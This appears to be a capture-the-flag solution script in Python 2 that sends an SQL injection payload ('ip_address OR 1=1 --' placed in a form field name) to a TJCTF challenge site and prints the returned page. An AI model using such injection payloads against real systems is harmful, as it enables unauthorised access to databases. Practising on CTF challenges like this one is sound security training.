#!/usr/bin/env python

import requests

url = 'https://ess-kyoo-ell.tjctf.org/'

s = requests.Session()

r = s.get(url)
# print r.text

data = {
	"id" : "*",
	"ip_address OR 1=1 --" : '',
}

r = s.post( url, data = data )
print '\n'.join(r.text.split('\n')[178:])

s.close()